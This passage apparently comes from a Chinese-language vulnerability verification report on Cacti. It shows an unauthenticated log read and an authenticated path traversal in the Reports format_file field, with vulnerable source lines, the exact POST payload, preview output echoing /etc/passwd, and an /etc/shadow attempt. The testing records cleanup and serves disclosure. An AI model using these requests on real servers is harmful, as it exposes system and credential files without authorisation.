| `GET /cacti/log/cacti.log` | **200**，`Content-Length: 44503507` | 未认证取得完整运行日志 |

## 四、条目 3（**已验证，需认证**）：CVE-2026-40084 / CVE-2026-41884 — Reports `format_file` 路径穿越任意文件读

> **认证边界：pre-auth 否** —— 需已登录且具备 **Reports 权限** 的会话；本机以管理员会话完成，**未验证低权限账号是否可达**。
> 影响：以 Cacti Web 进程身份读取服务器任意**可读**文件并回显至报告预览。
> 源码闭环：`lib/reports.php:631-643` 无规范化直接 `file()`；`lib/html_reports.php:277` 同函数内仅 `format_file` 未做 `form_input_validate`。
> 未闭合：可读范围上限、非管理员权限可达性、`varchar(255)` 对深层路径的限制。
> 已还原 `format_file=default.format`，无残留。

### 4.1 源码闭环（对照 `release/1.2.30`）

```php
// 写侧 lib/html_reports.php:277  —— 同函数内 name/font_size/graph_width 等都过 form_input_validate，唯独它没有
$save['format_file'] = get_nfilter_request_var('format_file');

// 读侧 lib/reports.php:631-643
$format_file = $config['base_path'] . '/formats/' . $format_file;   // 无 realpath / 无白名单
if (file_exists($format_file) && is_readable($format_file)) { $contents = file($format_file); }
foreach ($contents as $line) { if (substr($line, 0, 1) != '#') { $output .= $line . PHP_EOL; } }  // 原样进入输出

// 渲染 lib/html_reports.php:1586（preview 标签页）
print reports_generate_html($report['id'], REPORTS_OUTPUT_STDOUT);
```

### 4.2 运行时证据（基线 + 正例 + 边界，全部实测）

| `format_file` 取值 | 报告预览输出 |
|---|---|
| `default.format`（基线） | 正常报告模板：`<style type='text/css'> body { margin-left:auto; …` |
| `../../../../../../etc/hostname` | **`ubuntu`** |
| `../../../../../../etc/shadow` | **空** —— 以 Web 进程身份不可读（说明越权范围受文件权限约束） |
| `../../../../../../etc/passwd` | **整份回显**：`root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin/usr/sbin/nologin … www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin …` |

过程：① 读报告 id=6（靶场自建 `idor_real_1779807800`）原始值 `format_file=default.format`、`cformat=on`、`email=root@localhost`；② 认证 POST `reports_admin.php`（`action=save&save_component_report=1&id=6&format_file=../../../../../../etc/passwd`）→ 302；③ GET `…&tab=preview&id=6` → 200 且回显文件内容；④ 再次 POST 写回 `default.format`，回读确认 ✅。

**反证已排除**：起初用缺 `email` 必填项的 payload POST 时被 Cacti 自身校验拦下（`is_error_message()` 为真 → 不落库），说明**写侧身份与必填校验正常，缺陷仅在于 `format_file` 的取值不受校验**；`/etc/shadow` 读回为空也排除了"任何路径都被模板渲染"的可能。

目标/凭据全部参数化（`--host/--port/--base/--user/--password/--report-id/--file` 或环境变量 `CACTI_*`），缺参直接 `exit 2`；**脚本自动还原 `format_file`**。
完整证据：`evidence/cve-2026-40084.txt`。

- 按需求**自建专用账号** `poc_tester`（Cacti 用户 id=16，`realm=Local`，`enabled`）：**注册成功**——管理员用户列表中可见，并记录 `Last Login: Friday, September 18, 2026 01:56:45`。
- **口令验证结论（有直接证据）**：该账号**用户名/口令正确、认证通过**，但 Cacti 因"无任何区域权限"而**拒绝建立会话**。证据来自本机**未认证可读**的日志（条目 1 的同一入口）：
  ```
  2026-09-18 01:56:45 - AUTH LOGIN: User 'poc_tester' authenticated from IP Address '192.168.188.x'
  2026-09-18 01:56:45 - AUTH LOGIN FAILED: User poc_tester with id 16 does not have access to any area of Cacti.
  2026-09-18 01:58:12 - AUTH LOGIN FAILED: Local Login Failed for user 'poc_tester' from IP Address '192.168.188.x'.
  ```
  ⇒ `poc_tester` **可从任意位置触发登录、密码校验通过**，仅缺权限；一旦管理员在 *Users → (该用户) → 权限/用户组* 中授予任一区域权限，该账号即可用。**本次以管理员会话完成条目 3 的验证**，未替该账号提权。

- 口令仅保存在本机临时文件（**已清理**），**不入库、不写进报告**。
- **已回收（无残留）**：任务收尾时已用管理员会话将该账号**删除**。Cacti 的批量删除为两步式，关键是第二步必须回传确认页里 **PHP 序列化**的 `selected_items`（`a:1:{i:0;s:2:"16";}`），而不是字面量 `chk_16`（首次尝试即因传字面量而无效，日志留有 `unserialize(): Error at offset 9`）。
